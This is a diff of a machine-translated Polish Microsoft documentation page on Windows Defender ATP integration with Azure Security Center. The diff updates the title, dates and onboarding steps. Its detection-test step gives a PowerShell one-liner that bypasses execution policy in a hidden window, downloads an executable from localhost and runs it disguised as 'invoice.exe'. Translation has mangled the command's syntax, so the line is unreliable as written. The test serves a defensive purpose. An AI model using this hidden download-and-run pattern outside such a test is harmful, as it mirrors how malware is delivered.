@@ -1,5 +1,5 @@
 ---
-title: Windows Defender Advanced Threat Protection (ATP) z usługą Azure Security Center (publiczna wersja zapoznawcza) | Dokumentacja firmy Microsoft
+title: Usługa Windows Defender Zaawansowana ochrona przed zagrożeniami (ATP) w usłudze Azure Security Center | Dokumentacja firmy Microsoft
 description: Ten dokument wprowadza integrację między usługą Azure Security Center i usługi Windows Defender ATP.
 services: security-center
 documentationcenter: na
@@ -11,16 +11,16 @@ ms.devlang: na
 ms.topic: conceptual
 ms.tgt_pltfrm: na
 ms.workload: na
-ms.date: 09/06/2018
+ms.date: 09/20/2018
 ms.author: barclayn
-ms.openlocfilehash: f2cb4edd469d76f79e4134ca261bac5263bf3ce4
-ms.sourcegitcommit: f3bd5c17a3a189f144008faf1acb9fabc5bc9ab7
+ms.openlocfilehash: 5f604583aeb9a633d34bad633008e0c2ddeb3ef2
+ms.sourcegitcommit: 4ecc62198f299fc215c49e38bca81f7eb62cdef3
 ms.translationtype: MT
 ms.contentlocale: pl-PL
-ms.lasthandoff: 09/10/2018
-ms.locfileid: "44296061"
+ms.lasthandoff: 09/24/2018
+ms.locfileid: "47032040"
 ---
-# <a name="windows-defender-advanced-threat-protection-atp-with-azure-security-center-public-preview"></a>Windows Defender Advanced Threat Protection (ATP) z usługą Azure Security Center (publiczna wersja zapoznawcza)
+# <a name="windows-defender-advanced-threat-protection-atp-with-azure-security-center"></a>Usługa Windows Defender Zaawansowana ochrona przed zagrożeniami (ATP) w usłudze Azure Security Center
 
 Usługa Azure Security Center jest rozszerzenie oferty chmury obciążenia ochrony platformy (CWPP) dzięki integracji z usługą [usługi Windows Defender ATP](https://www.microsoft.com/WindowsForBusiness/windows-atp).
 Ta zmiana zapewnia kompleksowe funkcje do punktu końcowego wykrywania i odpowiedzi (EDR). Umożliwia on wykrywanie nieprawidłowości, wykrywanie ich i reagowanie na zaawansowane ataki na punkty końcowe serwera monitorowane przez usługę ASC.
@@ -43,7 +43,7 @@ Te możliwości są teraz dostępne w usłudze Azure Security Center:
 
 ![* Rysunek 1 cały obraz wyświetlany podczas badania, w tym alerty wygenerowane przez usługę ASC *](media/security-center-wdatp/image1.png)
 
-Można zbadać alert w usłudze Azure Security Center:
+Możesz [badanie](security-center-investigation.md) alertu w usłudze Azure Security Center:
 
 ![Rysunek 2 badania — usługa Azure Security Center](media/security-center-wdatp/image2.png)
 
@@ -59,7 +59,15 @@ Tylko serwery w ramach subskrypcji w warstwie standardowa
 
 ## <a name="onboarding-instructions"></a>Instrukcje dołączania
 
-- Jeśli możesz już dołączono wymagane serwery do usługi ASC w warstwie standardowa — żadne działania, ASC podłączone zostaną automatycznie serwerów WDATP.
+Aby sprawdzić, czy integracja usługi Windows Defender ATP jest włączona, można wybrać usługi Security center > zasady zabezpieczeń > subskrypcji > Edytuj ustawienia
+
+  ![Wyświetlanie zasad](media/security-center-wdatp/policy-management.png)
+
+Tutaj można zobaczyć integracji aktualnie włączone
+
+  ![Integracje włączone](media/security-center-wdatp/enable-integrations.png)
+
+- Jeśli możesz już dołączono wymagane serwery do usługi ASC w warstwie standardowa — żadna akcja ASC będą automatycznie dołączyć serwery WDATP. Może to potrwać do 24 godzin.
 
 - Jeśli użytkownik nigdy nie dołączono serwerów do warstwy standardowa usługi ASC warstwy — dołączanie do usługi ASC w zwykły sposób.
 
@@ -81,7 +89,7 @@ Jeśli masz serwer proxy lub zapory, która blokuje ruch anonimowe, zgodnie z cz
 
 1. Protokół RDP z jednym z maszyny wirtualne z systemem Windows Server (2012 R2 lub 2016) w subskrypcji i Otwórz okno wiersza polecenia
 
-2. W wierszu polecenia kopiowania, a następnie uruchom poniższe polecenie. Należy pamiętać, że w oknie wiersza polecenia zostanie zamknięte automatycznie.
+2. W wierszu polecenia kopiowania, a następnie uruchom poniższe polecenie. W oknie wiersza polecenia zostanie automatycznie zamknięte.
 
     -ExecutionPolicy - NoExit **PowerShell.exe obejścia - Nazwa_okna ukryty (modułu System.Net.WebClient New-Object). DownloadFile ("http://127.0.0.1/1.exe", "C:\\testu WDATP test\\invoice.exe"); Rozpocznij proces "C:\\testu WDATP test\\invoice.exe" **
 
@@ -95,6 +103,6 @@ Jeśli masz serwer proxy lub zapory, która blokuje ruch anonimowe, zgodnie z cz
 
 ## <a name="next-steps"></a>Kolejne kroki
 
-* [Ustawianie zasad zabezpieczeń w usłudze Azure Security Center](security-center-policies.md) — informacje na temat konfigurowania zasad zabezpieczeń dla subskrypcji i grup zasobów na platformie Azure.
-* [Zarządzanie zaleceniami dotyczącymi zabezpieczeń w usłudze Azure Security Center](security-center-recommendations.md) — Dowiedz się, w jaki sposób zalecenia ułatwiają ochronę zasobów platformy Azure.
-* [Monitorowanie kondycji zabezpieczeń w usłudze Azure Security Center](security-center-monitoring.md) — informacje o sposobie monitorowania kondycji zasobów platformy Azure.
+- [Ustawianie zasad zabezpieczeń w usłudze Azure Security Center](security-center-policies.md) — informacje na temat konfigurowania zasad zabezpieczeń dla subskrypcji i grup zasobów na platformie Azure.
+- [Zarządzanie zaleceniami dotyczącymi zabezpieczeń w usłudze Azure Security Center](security-center-recommendations.md) — Dowiedz się, w jaki sposób zalecenia ułatwiają ochronę zasobów platformy Azure.
+- [Monitorowanie kondycji zabezpieczeń w usłudze Azure Security Center](security-center-monitoring.md) — informacje o sposobie monitorowania kondycji zasobów platformy Azure.
